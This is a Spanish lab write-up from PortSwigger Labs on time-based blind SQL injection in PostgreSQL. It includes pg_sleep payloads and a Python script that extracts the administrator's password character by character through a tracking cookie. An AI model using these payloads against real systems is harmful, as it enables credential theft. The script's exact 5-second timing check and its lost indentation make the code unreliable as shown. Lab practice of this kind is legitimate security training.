Blind SQLi — Time Delays

Plataforma: PortSwigger Labs Tags: SQLiBlindTime-Based

Verificamos que es una base de datos PostGreSQL, por lo tanto usamen el siguiente payload para probar si hay retrasos:

' AND (SELECT pg_sleep(5))--

y vemos que hay delay por lo tanto ahora vamos a robar informacion aprovechando los delays con el siguiente payload y script (esto suponiendo que ya sabemos la longitud de la password):

' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')-- -

funcion para verificar tiempos de respuesta en python:

>[!nota] response.elapsed.total_seconds()

Script para automatizar la explotacion:

#!/usr/bin/python3

import requests


import string






url_input= 'https://0af900630378ccaf82b297c900d100e9.web-security-academy.net/'


caracters= string.ascii_lowercase + string.ascii_uppercase + string.digits


password= ''



for position in range(1,21):


for letter in caracters:

		

cookies = {"TrackingId":f"aBlhszmYn1ayUHBL' AND(SELECT CASE WHEN SUBSTRING(password,{position},1)='{letter}' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--","session":"cZ88aG3WPV5wkPFGgl0LFlRuHKdjiGnC"}


me_request = requests.get(url=url_input, cookies=cookies)


if me_request.elapsed.total_seconds()==5:


password+=letter


print(f"letra de la posicion {position} encontrada --> {letter}")


break


else:


continue


print(" -->", password)
